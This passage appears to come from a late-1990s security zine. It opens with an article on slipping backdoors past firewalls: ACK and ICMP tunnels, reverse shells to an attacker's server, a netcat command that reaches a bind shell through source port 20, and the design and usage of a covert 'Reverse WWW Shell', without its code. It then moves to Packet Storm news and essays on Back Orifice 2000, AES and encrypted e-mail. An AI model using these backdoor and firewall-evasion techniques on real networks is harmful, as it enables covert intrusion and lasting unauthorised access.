     work with a normal packet filter too, same for the proxy. Ideas for an
     application gateway backdoor will work for any architecture.
     Some of them are "active" and others "passive". "Active" backdoors are those
     which can be used by a hacker anytime he wishes, a "passive" one triggers
     itself by time/event so an attacker has to wait for this to happen.
     
     Packet Filters:
             It's hard to find a backdoor which gets through this one but does
             not work for any other. The few ones which comes into my mind
             is a) the ack-telnet. It works like a normal telnet/telnetd except
             it does not work with the normal tcp handshake/protocol but uses
             TCP ACK packets only. Because they look like they belong to an
             already established (and allowed) connection, they are permitted.
             This can be easily coded with the spoofit.h of Coder's Spoofit
             project (http://reptile.rug.ac.be/~coder).
             b) Loki from Phrack 49/51 could be used too to establish a tunnel
             with icmp echo/reply packets. But some coding would be needed to
             to be done.
             c) daemonshell-udp is a backdoor shell via UDP
                (http://r3wt.base.org  look for thc-uht1.tgz)
             d) Last but not least, most "firewall systems" with only a screening
             router/firewall let any incoming tcp connection from the source port
             20 to a highport (>1023) through to allow the (non-passive) ftp
             protocol to work. "netcat -p 20 target port-of-bindshell" is the
             fastest solution for this one.
     
     Stateful Filters:
             Here a hacker must use programs which initiates the connection from
             the secure network to his external 0wned server.
             There are many out there which could be used:
             active:  tunnel from Phrack 52.
                      ssh with the -R option (much better than tunnel ... it's
                      a legtimitate program on a computer and it encrypts the
                      datastream).
     
             passive: netcat compiled with the execute option and run with a
                      time option to connect to the hacker machine (ftp.avian.org).
                      reverse_shell from the thc-uht1.tgz package does the same.
     
     Proxies / Circuit Level Gateways:
             If socks is used on the firewall, someone can use all those stuff
             for the stateful filter and "socksify" them. (www.socks.nec.com)
             For more advanced tools you'd should take a look at the application
             gateway section.
     
     Application Gateways:
             Now we get down to the interesting stuff. These beasts can be
             intelligent so some brain is needed.
             active:  (re-)placing a cgi-script on the webserver of the company,
                      which allows remote access. This is unlikely because it's
                      rare that the webserver is in the network, not monitored/
                      checked/audited and accessible from the internet. I hope
                      nobody needs an example on such a thing ;-)
                      (re-placing) a service/binary on the firewall. This is
                      dangerous because those are audited regulary and sometimes
                      even sniffed on permanent ...
                      Loading a loadable module into the firewall kernel wich
                      hides itself and gives access to it's master. The best
                      solution for an active backdoor but still dangerous.
     
             passive: E@mail - an email account/mailer/reader is configured in a
                      way to extract hidden commands in an email (X-Headers with
                      weird stuff) and send them back with output if wanted/needed.
                      WWW - this is hard stuff. A daemon on an internal machine
                      does http requests to the internet, but the requests are
                      in real the answers of commands which were issued by a
                      rogue www server in a http reply. This nice and easy beast
                      is presented below (->Backdoor Example: The Reverse WWW Shell)
                      DNS - same concept as above but with dns queries and
                      replies. Disadvantage is that it can not carry much data.
                      (http://www.icon.co.za/~wosp/wosp.dns-tunnel.tar.gz, this
                      example needs still much coding to be any effective)
     
     
     
     
     ----[  Backdoor Example: The Reverse WWW Shell
     
     
     This backdoor should work through any firewall which has got the security
     policy to allow users to surf the WWW (World Wide Waste) for information
     for the sake and profit of the company.
     For a better understanding take a look at the following picture and try
     to remember it onwards in the text:
     
      +--------+                    +------------+              +-------------+
      |internal|--------------------|  FIREWALL  |--------------|server owned |
      |  host  |  internal network  +------------+   internet   |by the hacker|
      +--------+                                                +-------------+
        SLAVE                                                        MASTER
     
     Well, a program is run on the internal host, which spawns a child every day
     at a special time. For the firewall, this child acts like a user, using his
     netscape client to surf on the internet. In reality, this child executes
     a local shell and connects to the www server owned by the hacker on the
     internet via a legitimate looking http request and sends it ready signal.
     The legitimate looking answer of the www server owned by the hacker are
     in reality the commands the child will execute on it's machine it the
     local shell. All traffic will be converted (I'll not call this "encrypted",
     I'm not Micro$oft) in a Base64 like structure and given as a value for
     a cgi-string to prevent caching.
     Example of a connection:
     
     Slave
     GET /cgi-bin/order?M5mAejTgZdgYOdgIO0BqFfVYTgjFLdgxEdb1He7krjVAEfg HTTP/1.0
     
     Master replies with
     g5mAlfbknz
     
     The GET of the internal host (SLAVE) is just the command prompt of the
     shell, the answer is an encoded "ls" command from the hacker on the
     external server (MASTER).
     Some gimmicks:
     The SLAVE tries to connect daily at a specified time to the MASTER if
     wanted; the child is spawned because if the shell hangs for whatever
     reason you can check & fix the next day; if an administrator sees connects
     to the hacker's server and connects to it himself he will just see a
     broken webserver because there's a Token (Password) in the encoded
     cgi GET request; WWW Proxies (f.e. squid) are supported; program masks
     it's name in the process listing ...
     
     Best of all: master & slave program are just one 260-lines perl file ...
     Usage is simple: edit rwwwshell.pl for the correct values,
     execute  "rwwwshell.pl slave" on the SLAVE, and just run "rwwwshell.pl"
     on the MASTER just before it's time that the slave tries to connect.
     
     Well, why coding it in perl? a) it was very fast to code, b) it's highly
     portable and c) I like it.
     If you want to use it on a system which hasn't got perl installed, search
     for a similar machine with perl install, get the a3 compiler from the perl
     CPAN archives and compile it to a binary. Transfer this to your target
     machine and run that one.
     
     The code for this nice and easy tool is appended in the section THE CODE
     after my last words. If you've got updates/ideas/critics for it drop me an
     email. If you think this text or program is lame, write me at root@localhost.
     Check out http://r3wt.base.org  for updates.
     
     
     
     
     ----[  Security
     
     
     Now it's an interesting question how to secure a firewall to deny/detect
     this. It should be clear that you need a tight application gateway firewall
     with a strict policy. email should be put on a centralized mail server,
     and DNS resolving only done on the WWW/FTP proxies and access to WWW only
     prior proxy authentication. However, this is not enough. An attacker can
     tamper the mailreader to execute the commands extracted from the crypted
     X-Headers or implement the http authentication into the reverse www-shell
     (it's simple). Also checking the DNS and WWW logs/caches regulary with good
     tools can be defeated by switching the external servers every 3-20 calls
     or use aliases.
     
     A secure solution would be to set up a second network which is
     connected to the internet, and the real one kept seperated - but tell
     this the employees ...
     A good firewall is a big improvement, and also an Intrusion Detection
     Systems can help. But nothing can stop a dedicated attacker.
     
     
     
     
     ----[  Last Words

08.0 PacketStorm Security Sells Out?
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     Who's going to pick up the slack now that Ken has removed himself from
     affiliation with Packet Storm? the following sounds well and good but
     will this company (Securify) have the same contacts and receive updates
     as frequently as Ken used to? I doubt it...well it looks like PSS will 
     be relegated to being just an archive of old security tools and exploits
     hopefully the new system will at least do the old one some justice and 
     preserve the layout meanwhile we wish Ken WIlliams the best of luck in 
     his new job whatever that may be.... - Ed

      Packet Storm Moves to Kroll-O'Gara 


      contributed by jkw 
      As mentioned in the HNN rumors section last week Ken
      Williams has sold the rights to Packet Storm Security to
      Securify, the Information Security Group of The
      Kroll-O'Gara Company. Ken Williams will no longer be
      running the site and has accepted a different job within
      the Information Security industry. Securify hopes to
      have the site operational and online sometime in
      September.

      Security Firm to Revive
      Computer-Defense Site

      By PETER WAYNER

           roll-O'Gara, the international security consulting firm, said Monday
           it would take over an Internet site that not only posted information
      about defending computer systems against attacks but also told how to
      break into them. 

      In the shadowy world of hackers and crackers, it is often hard to tell the
      good guys from the bad. Computer-security experts frequently test
      systems by breaking into them, and the site, Packet Storm, posted
      descriptios of those break-ins. 

      Kroll-O'Gara's computer security unit, Securify, which declined to
      discuss financial terms of its acquisition, said it planned to maintain the
      site's tradition of high-quality information as a way to market its services.
      But Kroll-O'Gara executives said that it would rid the site of its more
      contentious publications. 

      "We see it, from a corporate standpoint, as somewhat risky and
      controversial," Charles Breed, Securify's vice president for marketing,
      acknowledged. "We'll be publishing a site with very powerful tools and
      they can be used for good or evil. Our opinion is that it's better to make
      knowledge available than keeping it obscure or hidden." 

      Tommy Ward, a project manager at Securify, said three Securify
      employees would comb through the site, "sanitizing content." 

      Until late June, Harvard University provided Packet Storm as a service
      and picked up the costs of answering requests for more than 10
      gigabytes of data traffic a day. 

      The site, which was edited by Ken Williams, a security consultant not
      associated with the university, proved popular with many computer
      experts because it collected detailed technical information about the
      methods intruders use to exploit weaknesses in computers. These
      often-fascinating narratives were mixed with discussions about how to
      help systems withstand assault. 

      Harvard dropped the site in late June after the host of a rival site
      complained that Packet Storm had posted defamatory information. 

      Joe Wrinn, a university spokesman, said, "We're happy that the site will
      be online again. That's the original reason we got involved." 

      Williams called the site "a labor of love," but said it was taking 60 to 80
      hours a week to maintain. He will not be associated with the site, which
      will be run by Securify employees at Securify.com. 

      Since Harvard pulled the plug, the site has been inaccessible; computer
      professionals looked forward to its relaunch, expected in late September.
      "I'm glad that the compendium of information is going to be preserved,"

     To The Supporters of Packet Storm Security:
     
     As you may already be aware, there have been numerous rumors
     on the Net recently regarding the revival of Packet Storm
     Security through corporate sponsorship. I am pleased to
     announce that the rumours are indeed true, and that Packet
     Storm will now be hosted by Securify, the Information Security
     Group of Kroll-O'Gara.
     
     I have carefully considered the direction and future of PSS
     since it was taken down by Harvard, and have entertained
     innumerable offers from a wide variety of corporate, non-profit,
     and private entities to host the site.  Kroll-O'Gara has
     presented me with the most impressive vision and plans for PSS.
     Not only does Kroll-O'Gara intend to preserve the original
     ideals and intent of PSS, but they have developed an exciting
     and definitive roadmap for the logical evolution of the site.
     
     Packet Storm Security had reached a stage where it was much
     more than a full time job for one person.  For the last year
     I have been working a minimum of 60 hours a week to maintain
     the high quality of the site.
     
     In order to sustain my vision of PSS as *the* resource on the
     Internet for freeware Information Security tools, it became
     necessary to acquire the resources that only a dedicated
     corporate sponsor could provide.  I have talked at length with
     Matt Barrie (PSS Program Manager) at Kroll-O'Gara ISG, and I
     believe that they have grand and noble goals for the future of
     Packet Storm Security.
     
     Unfortunately, I will not be with PSS in the future, however,
     because I have recently accepted an extremely enticing offer
     elsewhere in the Information Security industry. I do,
     nevertheless, give my strongest support to the new maintainers
     of the site, and I'm excited about what's in store for the
     future of PSS.
     
     To all of my valued friends and supporters of the site:
     I sincerely hope that you too will continue through your
     contributions and suggestions to help make Packet Storm what
     it was! Your support has been and will continue to be invaluable
     in ensuring that PSS is *the* resource for freeware Information
     Security tools.
     
     Respectfully,

     KROLL-O'GARA INFORMATION SECURITY GROUP ACQUIRES PACKET STORM, THE PREMIER
     WEB SITE FOR INFORMATION SECURITY TOOLS & DATA
     
     
     Packet Storm Security is positioned to be the Internet's largest single
     source for computer security threat information, tools and patches
     
     
     
     PALO ALTO, Calif., August, 17, 1999  In response to the growing demand for
     current and accurate information and tools on computer security, Securify,
     the Information Security Group of The Kroll-O'Gara Company (Nasdaq: KROG),
     announced today the acquisition of Packet Storm Security; a website
     created and maintained by Ken Williams, a renowned computer security
     expert. Averaging over 400,000 hits per day, generating over 7 gigabytes
     of traffic, Packet Storm Security is an established resource for many
     government agencies and major corporations.
     
     
     "Packet Storm Security provides a strong, long term Internet presence for

                 Back Orifice 2000
     
     
     
     
     Back Orifice is a free remote administration tool for Microsoft Windows.
     It's also one of the coolest hacking tools ever developed.  Originally
     released last July, Back Orifice 2000 (BO2K) is the current release of the
     software.  It works on Windows 95, Windows 98, and Windows NT.  It is much
     better written than the original Back Orifice.  And it's free, and open source.
     
     
     There are two parts: a client and a server.  The server is installed on the
     target machine.  The client, residing on another machine anywhere on the
     Internet, can now take control of the server.
     
     
     This is actually a legitimate requirement.  Perfectly respectable programs,
     like pcAnywhere or Microsoft's own Systems Management Server (SMS), do the
     same thing.  They allow a network administrator to remotely troubleshoot a
     computer.  They allow a remote tech support person to diagnose problems.
     They are mandatory in many corporate computing environments.
     
     
     Remote administration tools also have a dark side.  If the server is
     installed on a computer without the knowledge or consent of its owner, the
     client can effectively "own" the victim's PC.
     
     
     Back Orifice's difference is primarily marketing spin.  Since it is not
     distributed by a respectable company, it cannot be trusted.  Since it was
     written by hackers, it is evil.  Since its malicious uses are talked about
     more, its benevolent uses are ignored.  That's wrong; pcAnywhere is just as
     much an evil hacking tool as Back Orifice.
     
     
     Well, not exactly.  Back Orifice was designed by a bunch of hackers with
     fun in mind.  Not only can the client perform normal administration
     functions on the server's computer -- upload and download files, delete
     files, run programs, change configurations, take control of the keyboard
     and mouse, see whatever is on the server's screen -- but it can also do
     more subversive things: reboot the computer, display arbitrary dialog
     boxes, turn the microphone or camera on and off, capture keystrokes (and
     passwords).  And there is an extensible plug-in language for others to
     write modules.  (I'm waiting for someone to write a module that
     automatically sniffs for, and records, PGP private keys.)
     
     
     Back Orifice is also designed to hide itself from the server's owner.
     Unless the server's owner is knowledgeable (and suspicious), he will never
     know that Back Orifice is running on his computer.  (Other remote
     administration tools, even SMS, also have stealth modes; Back Orifice is
     just better at it.)  Anti-virus software has been updated to detect default
     Back Orifice configurations, but that will only solve most of the problem.
     Because Back Orifice is configurable, because it can be downloaded in
     source form and then recompiled to look different...I doubt that all
     variants will ever be discovered.
     
     
     Okay, so who's to blame here?  The Cult of the Dead Cow wrote and released
     Back Orifice.  Surely the world is not a safer place because, as CDC's Sir
     Dystic put it: "every 14-year-old who wants to be a hacker will try it."
     BO2K's slogan is "show some control," and many will take that imperative
     seriously.  Back Orifice will be used by lots of unethical people to do all
     sorts of unethical things.  And that's not good.
     
     
     On the other hand, Back Orifice can't do anything until the server portion
     is installed on some victim's computer.  This means that the victim has to
     commit a security faux pas before anything else can happen.  Not that this
     is very hard: lots of people network their computers to the Internet
     without adequate protection.  An attacker can even ask the victim to
     install Back Orifice (social engineering might help); the Worm.ExploreZip
     worm of this spring did exactly that.  Still, if the victim is sufficiently
     vigilant, he can never be attacked by Back Orifice.
     
     
     But what about Microsoft's computing environment?  One of the reasons Back
     Orifice is so nasty is that Microsoft doesn't design its operating systems
     to be secure.  It never has.  Any program that runs in Microsoft Windows 95
     and 98 can do anything.  In Unix, an attacker would first have to get root
     privileges.  Not in Windows.  There's no such thing as limited privileges,
     or administrator privileges, or root privileges.  Microsoft assumes that
     anyone who can run a program can reformat the hard drive.  This might have
     made some sense in the age of isolated desktop computers; after all, if you
     could run a program, you were standing in front of the machine.  But on the
     Internet, this is absurd.
     
     
     Windows NT was designed as a secure operating system, more or less.  There
     are provisions to make Windows NT a very secure operating system, such as
     privilege levels in separate user accounts, file permissions, and kernel
     object access control lists.  However, the configuration that makes Windows
     NT secure is very very far and distant from the default installed
     configuration.  Microsoft admits this.  You have to make 300+ security
     checks and modifications to Windows NT to make it secure in its default
     configuration.  And on top of this, Microsoft assumes that most users have
     Administrator access to their desktop machines anyway.  They only really
     worry about network security, not host-end security, which is where they
     are seriously vulnerable to attacks like Back Orifice 2000.  Windows NT
     could be secure, but Microsoft refuses to ship the OS in that condition
     (presumably they worry that their spiffy animated fading menu bars may be
     overlooked).
     
     
     Malicious remote administration tools are a major security risk.  What Back
     Orifice has done is made mainstream computer users aware of the danger.
     Maybe the world would have been safer had they not demonstrated the danger
     so graphically, but I am not sure.  There are certainly other similar tools
     in the hacker world -- one, called BackDoor-G, has recently been discovered
     -- some developed with much more sinister purposes in mind.  And Microsoft
     only responds to security threats if they are demonstrated.  Explain the
     threat in an academic paper and Microsoft denies it; release a hacking tool
     like Back Orifice, and suddenly they take the vulnerability seriously.

     "Notes on the Design and Analysis of the Yarrow Cryptographic Pseudorandom
     Number Generator"
     
     
     J. Kelsey, B. Schneier, and N. Ferguson, Sixth Annual Workshop on Selected
     Areas in Cryptography, Springer Verlag, August 1999, to appear.
     
     
     We describe the design of Yarrow, a family of cryptographic pseudo-random
     number generators (PRNG). We describe the concept of a PRNG as a separate
     cryptographic primitive, and the design principles used to develop Yarrow.
     We then discuss the ways that PRNGs can fail in practice, which motivates
     our discussion of the components of Yarrow and how they make Yarrow secure.
     Next, we define a specific instance of a PRNG in the Yarrow family that
     makes use of available technology today.

                    NIST AES News
     
     
     
     
     AES is the Advanced Encryption Standard, the encryption algorithm that will
     eventually replace DES.  In 1997, the U.S. government (NIST, actually),
     solicited candidate algorithms for this standard.  By June 1998 (the
     submission deadline), NIST received fifteen submissions.  NIST asked for
     comments on these algorithms, with the intention of pruning the list to
     five finalists.  NIST held an AES conference in Rome in April (this was the
     second AES conference, the first was the previous August in California),
     the comment deadline was in June, and last Monday NIST announced the finalists.
     
     
     They are:
     
     
             Mars, submitted by a large team at IBM.
             RC6, from RSA Data Security (including Ron Rivest)
             Rijndael, from a team of excellent Belgian cryptographers
             Serpent, by three very respected cryptographers, Ross Anderson,
               Eli Biham, and Lars Knudsen
             Twofish, from Counterpane Systems, including myself
     
     
     NIST didn't just announce the five finalists.  They published a 52-page
     report explaining their rationale -- why they chose the algorithms they did
     and why they did not chose the algorithms they didn't -- and it is worth
     reading to peek at their decision process.  It's at
     http://csrc.nist.gov/encryption/aes/round2/round2.htm#NIST
     
     
     The next step is to choose among the finalists.  NIST is again soliciting
     comments on the algorithms, and there will be a third AES Candidate
     Conference in New York in April 2000, held in conjunction with the 7th Fast
     Software Encryption workshop.  Comments are due by 15 May 2000, and then
     NIST will propose a standard.  The AES will then go through the formal
     government approvals process and become a Federal Information Processing
     Standard (FIPS), and presumably will become the standard encryption
     algorithm for all sorts of international applications.  Expect all this to
     happen by the summer of 2001; the government moves slowly.
     
     
     Cryptographers are busily analyzing the submissions for security.  It's
     tempting to think of the process as a big demolition derby: everyone
     submits their algorithms and then attacks all the others...the last one
     standing wins.  Really, it won't be like that.
     
     
     At the end of the analysis period, I don't expect serious weaknesses to be
     found in any of the finalists.  The winner will be chosen based on other
     factors: performance, flexibility, suitability.
     
     
     This means that we need your input into this process.  I know you're not
     cryptographers, and you won't be able to comment on the mathematics of the
     various submissions.  But you can comment on your encryption requirements,
     and whether the algorithms will suit your needs.
     
     
     AES will have to work in a variety of current and future applications,
     doing all sorts of different encryption tasks: 32-bit microprocessors,
     64-bit microprocessors, small 8-bit smart cards, DSPs, FPGAs, custom ASICs,
     and everything else we can't even imagine yet.
     
     
     Choosing a single algorithm for all these applications is not easy, but
     that's what we have to do.  It might make more sense to have a family of
     algorithms, each tuned to a particular application, but there will be only
     one AES.  And when AES becomes a standard, customers will want their
     encryption products to be "buzzword compliant."  They'll demand it in
     hardware, in desktop computer software, on smart cards, in
     electronic-commerce terminals, and other places we never thought it would
     be used.  Anything we pick for AES has to work in all those applications.
     
     
     So how do you comment?  NIST is accepting formal comments either on paper
     or by email.  See http://www.nist.gov/aes for instructions.  Be sure to
     identify who you represent and what cryptography interests you have.
     Remember, AES is going to be your cryptography standard for the 21st
     century.  We need your help.

     The Doghouse: HPUX and the UNIX Crypt Algorithm
     
     
     
     
     Here is a comparison of the Solaris and HPUX man pages for the UNIX "crypt"
     encryption function.  Same algorithm, different interpretations, different
     conclusion.
     
     
     According to the Solaris 2.6 Crypt man page, "crypt implements a one-rotor
     machine designed along the lines of the German Enigma, but with a
     256-element rotor.  Methods of attack on such machines are widely known,
     thus crypt provides minimal security."
     
     
     According to the HPUX10.20 man page, "crypt implements a one-rotor machine
     designed along the lines of the German Enigma, but with a 256-element
     rotor.  Methods of attack on such machines are known, but not widely;
     moreover the amount of work required is likely to be large."
     
     
     Reading the HPUX man page, you get the impression that crypt offers
     adequate protection for your files.  It is a sad statement when
     cryptographic algorithms that are broken as homework for cryptography
     students are put forward as a means to protect data by a mainstream OS vendor.
     
     
     
     ** *** ***** ******* *********** *************
     
     
             Web-Based Encrypted E-Mail
     
     
     
     
     The idea is enticing.  Just as you can log onto Hotmail with your browser
     to send and receive e-mail, there are Web sites you can log on to to send
     and receive encrypted e-mail.  HushMail, ZipLip, YNN-mail, ZixMail.  No
     software to download and install...it just works.
     
     
     But how well?
     
     
     HushMail &lt;http://www.hushmail.com> is basically a PGP or S/MIME-like e-mail
     application that uses Java (although oddly enough, HushMail is not
     compatible with either).  The sender logs onto the HushMail Web site, and
     encrypts messages using a Java applet that is automatically downloaded onto
     his machine.  Both the sender and receiver need to have HushMail accounts
     for this to work.  Accounts can be anonymous.
     
     
     The algorithms are 1024-bit ElGamal for key exchange and signatures, and
     Blowfish for bulk encryption.  But everyone's private key is stored on the
     HushMail server, protected in a passphrase.  This means that one weak link
     is likely to be the passphrase; it's the only protection you have against
     someone who has legal or illegal access to the HushMail server.  (The
     current beta -- August 99 -- doesn't let you change your passphrase,
     although they promise the feature in the future.)
     
     
     Another weak link is the Java applet.  When you download it, you have no
     idea if it is the correct applet.  Yes, the source code is public, but that
     doesn't help when you are at a public Internet terminal trying to encrypt
     or decrypt private e-mail.  A Trojaned Java applet can do all sorts of
     damage, and there is no way to know.  Sure, you use an SSL connection
     between your computer and the HushMail server, but if you don't actually
     check the details of the received certificate, you have no idea who you are
     connected to.  HushMail is considering writing something to verify the
     applet automatically, but then how do you trust the verifier?
     
     
     This is actually a major problem.  The applet can be signed, but who signed
     it?  Even if you check the certificate, the typical browser permits a dozen
     different PKI roots by default, and any one of them can issue a forged
     certificate.  This means you have to trust them all.  And you have to trust
     that a Trojan didn't drop a phony certificate into your browser.  Note that
     a downloaded verifier can never solve this problem; it just turns the "how
     do I trust the applet" question into "how do I trust the verifier."
     
     
     And a third possible weakness is the location of the HushMail servers.
     Although the company is based in Antigua, the servers are located in
     Canada.  Presumably Canada is more susceptible to legal attacks.  And
     remember that the security depends on the physical protection of the
     HushMail server.
     
     
     All in all, though, HushMail seems like a reasonable implementation of the
     idea.  The company seems clued; they have a reasonably informative Web
     site, and respond promptly to security questions.
     
     
     ZipLip &lt;http://www.ziplip.com> is different.  Both parties do not need an
     account to communicate.  The sender logs onto the ZipLip Web site and,
     using SSL, sends a message to someone else.  ZipLip then sends the
     recipient a message telling him that your message is waiting.  The
     recipient then logs onto ZipLip to receive the message.  Encryption,
     outside the two SSL connections, is completely optional.
     
     
     ZipLip won't identify the encryption algorithm used, which is enough to
     discount them without further analysis.  But they do something even
     stupider; they allow the sender to create an encryption key and then give
     the recipient a "hint" so that he can guess it.  ZipLip's own Web site
     suggests:  "The name of the project we're working on," or "The restaurant
     where we had dinner last night."  Maybe there are 100,000 restaurants, so
     that's a 17-bit key.
     
     
     The threats here are serious.  Both the sender and receiver need to verify
     their SSL connections, otherwise there is no security.  The ZipLip server
     is a major attack target, both because many messages will not be encrypted,
     and because those that are will have keys weakened by the requirement that
     both parties remember them.
     
     
     On the plus side, ZipLip claims a policy of deleting all mail 24 hours
     after delivery, which provides a level of lawyer-proofing that HushMail
     does not have...if they implement it properly.
     
     
     YNN-mail &lt;http://www.ynnmail.com> is barely worth this paragraph.  They
     encrypt stored messages with a 40-bit key, and don't use SSL when you sign
     up and send them a long-term password.  Snake-oil if I've ever seen it.
     
     
     And I just heard of another, ZixMail &lt;http://www.zixmail.com/>.  I didn't
     have time to examine it in depth, but the FAQ -- look at their wishy-washy
     comments on encryption -- makes it sound like real snake oil, too.
     
     
     Web-based encrypted e-mail is less secure than PGP-encrypted e-mail (or
     S/MIME e-mail) for a few reasons.  One, the constant interaction between
     the communicants and the server leaves more opportunity for
     man-in-the-middle attacks, Trojan horses, etc.  Two, SSL-based
     authentication is more vulnerable to spoofing, since almost no one ever
     bothers to check the details of received certificates and there is no
     revocation mechanism in place.  And three, there are some very attractive
     attack targets: servers with large collections of secret e-mail and
     potential decryption keys.  Certainly Web-based encrypted e-mail is better
     than unencrypted e-mail, but I'd stick with PGP or S/MIME if possible.

     Subject: Crypto-Hacking
     
     
     For all it's worth, it looks like you were beaten to the punch -- I can
     find at least four prior uses of "crypto-hacking" or "cryptohacking".
     
     
     Google turned up the following, among others:
     
     
     http://cc2.gamestats.com/wwwboard/messages/894.html
     http://www.hotwired.com/talk/club/special/transcripts/96-03-13.levy.html
     
     
     All of them seem to use it to mean hacking a system that employs
     cryptography rather than hacking cryptography itself, however -- your
     definition is a more useful contribution to the vocabulary.
     
     
     
     From: John Savard
     Subject:  Cluelessness Alert.  I'm not so sure.
     
     
     I certainly do agree that the military can safely allow public information
     to be stored on Web sites on commercial hosts.  However, I have noted that
     a lot of military sites are actually on U.S. Government-owned machines in
     the .mil domain.
     
     
     And it is difficult, particularly using common commercially-available
     operating systems and Internet hosting software, to maintain the kind of
     impregnable security needed for any system that also contains sensitive
     information.
     
     
     There are ways of making an Internet server essentially immune to most
     kinds of hacking.  Macintosh servers, not having a CLI, appear to be quite
     secure.  But there are other techniques, most of which require custom
     software and even custom hardware.
     
     
     For example, to take an idea from the telephone company, how about a
     computer with two CPUs.  CPU number 1 is connected to the hard drive
     containing the software for the computer, and has read-write access to all
     of RAM.  CPU number 2 is the one connected to the network.  It has
     read-only access to the chunk of memory from which it runs programs.  But
     it has read-write memory for storing data, and read-only access to a hard
     drive containing the Web site it is to present to the Internet.  If it also
     has data to store, it gets write access to a hard drive for that purpose.
     The access is determined by *hardwired connections*, not by operating
     system privileges which can be subverted.
     
     
     In most operating systems, either the Microsoft ones or the Unix clones,
     networking is part of the operating system, and the TCP/IP connection to
     the Internet is part of that network.  It has to be explicitly limited in
     its privileges, and if someone gets Administrator privileges/root access,
     that can be overturned.  That shouldn't happen, but any bug in the OS is a
     possible back door.
     
     
     Now, suppose instead that the OS didn't even HAVE networking in it.  The
     port connected to the Internet was something the OS didn't even know about,
     and everything that port did was under the control of one unprivileged
     *applications program*.  Even if the OS didn't even have security -- say it
     was MS-DOS -- with precautions against such attacks as buffer overrun, an
     applications program with narrowly focussed capabilities could be quite secure.
     
     
     If one doesn't go to these kinds of lengths, though, while it is true that
     constant vigilance and the use of more conventional security methods (i.e.
     firewalls) can give "pretty good" security, I think the Pentagon is
     entirely justified in taking the attitude that the kind of *ironclad*
     security they need just isn't available if one connects to the Internet.
     I'm quite sure that the NSA or whoever could come up with a
     "super-firewall" that could act as a public Web-site host, and yet be
     updated from within a highly sensitive computer network, with safety.  But
     it would take technologies like the two-CPU sketch above, which just aren't
     available off the shelf.  And it's off-the-shelf technologies that have
     been used for much of the military's Internet presence.
     
     
     So while it is true there is a way for the military to stay on-line and
     maintain security, it is also true that that is not immediately available.
     Taking some Web sites off-line until the vulnerabilities can be remedied
     isn't a silly policy, even if there may be some individual examples of
     cluelessness where sites involving no exposure are taken down.
     
     
     
     From: dragon@revealed.net
     Subject: Re: Major cluelessness alert
     
     
     I just read your blurb on the Army's consideration of pulling off of the
     net, and I felt I had to comment.  In particular, I disagree with the page
     which you felt had "a good analysis of this idiotic idea".
     
     
     While I agree that a simple knee-jerk reaction to shut off the Internet
     connection just because X company did so is not prudent, I do believe that,
     in an organization with an educated security staff, there is a place for a
     temporary shut-down of the connection.  In particular, I was involved in
     making this decision for one of the companies I work with, and we were
     concerned with two points: 1) since Melissa was propagating via e-mail with
     little human intervention, we decided to cut off access until we had gotten
     enough control on our internal population to not propagate to our business
     partners in the way that other large companies had done to us, and 2) to
     give our admins the breathing room to be able to rationally understand what
     the impact on our production systems were and to implement the
     updates/fixes that were coming to us from our suppliers.
     
     
     I don't know how anyone can say that it's idiotic to disconnect from the
     Internet when in the face of an attack which is both significant in scope
     and relatively unknown in implementation.  Yes, it could be considered to
     be paranoid, xenophobic, and reactionary, and it's true that it is not
     necessarily any safer to be connected on any other day, but to deny a
     security staff the ability to raise the drawbridge until the immediate
     threat is at least understood hoodwinks us to the point that we won't
     really be able to function.
     
     
     Finally, I have to say that I agree with at least a part of the military's
     decision to pull back.  The one thing that they mentioned was that they
     were attempting to correct the positioning of sensitive data.  There is a
     lot of information, military or otherwise, that has no place on the public
     Internet.    The running joke in our department is that the only secure
     computer is one that is powered off, melted into slag, encased in concrete,
     and buried at the bottom of the ocean.  Your own writings show that not
     even cryptography is completely reliable due to advances in mathematics and
     side-channel attacks.  There are many, many circumstances where the
     sensitivity and criticality of data demands location on a network that is
     air-gap protected from others, whether those other networks are the public
     Internet, less-secure Intranets, or private WANs connecting to suppliers
     and dealers.  The real idiocy is placing data which needs to be kept secure
     on machines which are accessible via public, or near-public, channels.

     Regarding encrypted ZIP file cracking:
     
     
     While brute forcing the password may work most of the time for most people
     and take less time, there is also a known-plaintext attack, which only
     requires 13 known bytes.  Check out

     Subject: SSL at Wells Fargo
     
     
     Wells Fargo's on-line banking site is still using SSL v2 ... doesn't
     support browsers configured to use more secure versions (v3, TLS) and has
     even rejected SSL v2 connections that don't use RC2 (deprecated).  I'm sure
     you understand the SSLv2/RC2 issues, even when 128-bit keys are in use;
     they're just not as strong as other protocols/ciphers, at least for the
     front-door sorts of attacks that were NOT your point.
     
     
     The "simple" bungle on their site, however, is that if you've adopted a
     policy that you're not going to use SSLv2 for "secure" transactions, the
     Wells Fargo site says to you that your browser isn't secure enough, and you
     need to get a 128-bit browser.  Doesn't say "you must enable an obsolescent
     version with a dubious cipher" ... which it could say, very easily.  It
     says something completely wrong.
     
     
     That was a useful collection of basic bungles.  Don't forget the other
     type, using an HTTPS page that's got sensitive data in query params for its
     URL, and an http://... link that'll cause that sensitive data to be logged
     in what are usually insecure logfiles.  (No current examples handy -- but

     Subject: SSL at BT
     
     
     British Telecom (BT) are another company with worrying views on Internet
     security.  You'd think with their image and standing that they could do better.
     
     
     Their e-services Web page [www.bthome.com/e_services/index_sh.html] allows
     home users to check and amend various account details and services.
     
     
     But despite the spread of strong crypto Web-browsers [www.opera.com] and
     security upgrades for IE, Windows and Netscape [www.replay.com], BT only
     chose to use 40-bit SSL.
     
     
     This is accompanied by the following endorsement and warning:
     
     
     "When ordering goods and services make sure the Web site you are using uses
     a 'Secure Socket Layer (SSL)' session.  The BT Shop - At Home uses such
     sessions from the moment you start to place an order."
     
     
     Also: "If you are still uneasy about using the Web to order on-line then
     you should use an alternative method of ordering."
     
     
     Hardly inspiring, is it?
     
     
     It also makes one dubious about their "Secure Site Programme":
     
     
     "Trustwise Secure Sites use a BT Secure Server certificate to establish
     proof of identity of the owner of the Web site and enable secure
     communication between the Web site and visitors to that site.
     
     
     "BT carefully checks the identity of the organization that owns the Web
     site and verifies that the Web site is registered to that organization.
     
     
     The BT Trustwise Secure Site Programme allows you to learn more about the
     Web sites you visit before you submit any sensitive or confidential
     information."
     
     
     Again, I could only find 40-bit SSL in operation, despite the "Trustwise"
     logo [e.g. see http://www.bt.com/Talk/].

     Subject: AES
     
     
     NIST has just announced that the finalists in the Advanced Encryption
     Standard competition are MARS, RC6, Rijndael, Serpent and Twofish.  That
     makes three U.S. algorithms, one Belgian, and one which I developed in
